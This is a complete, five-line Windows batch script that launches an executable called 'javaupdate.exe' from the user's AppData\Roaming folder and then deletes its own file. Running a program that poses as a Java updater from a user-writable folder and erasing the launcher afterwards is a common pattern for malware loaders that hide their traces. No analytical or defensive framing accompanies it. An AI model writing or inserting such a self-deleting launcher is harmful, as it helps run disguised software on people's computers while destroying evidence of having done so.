@ECHO OFF
SETLOCAL
REM appdata == C:\Users\<user>\AppData\Roaming\
"%APPDATA%\javaupdate.exe"
DEL "%~f0"
